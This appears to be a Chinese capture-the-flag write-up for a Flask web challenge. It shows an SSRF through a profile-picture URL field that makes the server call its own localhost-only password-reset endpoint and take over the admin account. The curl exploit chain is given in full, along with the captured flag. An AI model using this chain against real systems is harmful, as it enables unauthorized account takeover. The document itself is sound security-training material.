## 题解

### 入口与指纹

`Werkzeug/3.0.6` + `Python/3.8.20`，标题 `Synthwave User Portal`。

登录页 HTML 里有一大段注释，**把六个接口的说明全写出来了**：

```text
1. /                GET        登录与否跳转到 /profile 或 /login
2. /register        GET, POST  username / password / first_name / last_name / email
3. /login           GET, POST  username / password
4. /logout          GET
5. /profile         GET, POST  first_name / last_name / email /
                               profile_picture（上传）/ profile_picture_url（按 URL 抓取）
6. /reset_password  GET        username / newpassword，**只有 localhost 能访问**
```

### 关键观察

**1. `/reset_password` 只看真实来源地址，头伪造无效。**

```bash
curl 'http://$T/reset_password?username=admin&newpassword=pwn12345'
# 403 Unauthorized
```

试过 `X-Forwarded-For`、`X-Real-IP`、`X-Client-IP`、`X-Originating-IP`、
`Forwarded: for=`、`Client-IP` 六种头，全部 403——它读的是 socket 对端地址。

**2. `/profile` 的 `profile_picture_url` 是服务端抓取（SSRF）。**

注释里直接写了"The URL to fetch a new profile picture"，即服务端会去
访问这个 URL。于是可以让**服务端自己**去调用 `/reset_password`：

```bash
POST /profile
profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=pwn12345
```

这条请求来自容器内部，来源地址是 127.0.0.1，`/reset_password` 放行，admin 的密码被改成 `pwn12345`。

**3. 提权后 profile 页直接给 flag。**

```bash
curl -c adm -d 'username=admin&password=pwn12345' http://$T/login
curl -b adm http://$T/profile | grep -o 'flag{[^}]*}'
```

```html
value="Admin" value="User" value="admin@example.com"
flag{f40d246b-b417-4712-a97b-f8e0d4ca1368}
```

### 利用链

```bash
T=$(head -1 .target)
u=$(mktemp)

# 1. 注册并登录一个普通账号（重置接口不需要登录，但 /profile 需要）
curl -sS -c $u -b $u -X POST \
  -d 'username=u1&password=p1&first_name=A&last_name=B&email=a@b.c' "http://$T/register"
curl -sS -c $u -b $u -X POST -d 'username=u1&password=p1' "http://$T/login"

# 2. 用 profile_picture_url 让服务端自己重置 admin 密码
curl -sS -b $u -X POST \
  --data-urlencode 'first_name=A' --data-urlencode 'last_name=B' \
  --data-urlencode 'email=a@b.c' \
  --data-urlencode 'profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=pwn12345' \
  "http://$T/profile"

# 3. 用新密码登录 admin，读 profile
a=$(mktemp)
curl -sS -c $a -b $a -X POST -d 'username=admin&password=pwn12345' "http://$T/login"
curl -sS -b $a "http://$T/profile" | grep -o 'flag{[^}]*}'
```

### flag 位置

管理员账号（`admin`）的 `/profile` 页面正文。

## 复盘

- **页面注释是最廉价的地图。** 这一题的注释把 6 个接口、参数名、以及
  "`/reset_password` 只有 localhost 能访问"都写清楚了，等于把攻击面直接摊开。
  看到大段注释先把接口清单抄下来，比目录爆破快一个数量级。
- **"只有 localhost 能访问"必须配上 SSRF 才有意义。** 单看这一句会以为是无解的限制，
  但同一个应用里只要有服务端抓取（`profile_picture_url`），就能把"我"变成"localhost"。
  这两条同时出现在注释里，本身就是出题人的提示。
- **IP 白名单要用真实连接地址判断。** 本题只认 socket 对端，所以
  `X-Forwarded-For` 之类的头全部无效——先花 6 个请求确认这一点，
  再去想 SSRF，避免在白名单绕过上空转。
- **重置密码比 RCE 更"温和"且更直接。** 拿到别人账号的新密码后，
  用正常登录流程访问它的数据，不需要任何文件写入或命令执行。
